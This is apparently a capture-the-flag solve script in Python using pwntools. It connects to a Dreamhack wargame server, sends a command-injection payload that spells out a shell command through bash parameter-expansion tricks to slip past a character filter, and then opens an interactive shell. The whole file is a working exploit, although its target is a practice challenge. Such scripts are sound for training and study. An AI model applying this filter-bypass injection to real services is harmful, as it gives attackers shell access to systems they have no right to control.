from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 10428
r = remote(HOST, PORT)

payload = b'${PATH##*:}${PWD%?????}${USER%?????}${USER#?????}'
r.sendlineafter(b': ', payload)
# r.sendline(b'echo TEST')

r.interactive()